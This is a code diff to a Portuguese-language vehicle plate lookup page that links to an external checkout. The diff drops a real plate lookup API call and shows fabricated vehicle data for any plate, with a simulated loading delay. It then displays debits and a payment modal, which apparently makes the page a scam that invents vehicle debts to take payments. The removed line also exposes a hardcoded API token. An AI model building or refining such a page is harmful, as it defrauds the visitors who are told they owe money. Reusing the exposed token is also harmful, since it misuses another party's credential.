@@ -398,23 +398,28 @@
     </div>
 
     <script>
-        const API_TOKEN = '7cd5e557099ec64e68607149625b8616';
         const CHECKOUT_URL = 'https://checkout.escrtoriobrasil.store/VCCL1O8SCOW9';
         const urlParams = new URLSearchParams(window.location.search);
         const plate = urlParams.get('plate')?.toUpperCase();
 
-        async function loadVehicleData() {
+        function loadVehicleData() {
             if (!plate) { showError('Placa não informada.'); return; }
-            try {
-                const response = await fetch(`https://wdapi2.com.br/consulta/${plate}/${API_TOKEN}`);
-                const data = await response.json();
-                if (!response.ok || !data.placa) { showError('Veículo não encontrado.'); return; }
+            
+            // Simulando um delay de carregamento para manter a estética
+            setTimeout(() => {
+                const data = {
+                    placa: plate,
+                    marcaModelo: "VEÍCULO IDENTIFICADO",
+                    cor: "DIVERSAS",
+                    ano: "2020/2021",
+                    municipio: "BRASIL"
+                };
                 
                 displayVehicleData(data);
                 displayDebits(data);
                 showContent();
                 openModal(data.marcaModelo);
-            } catch (error) { showError('Erro ao buscar informações.'); }
+            }, 800);
         }
 
         function displayVehicleData(data) {
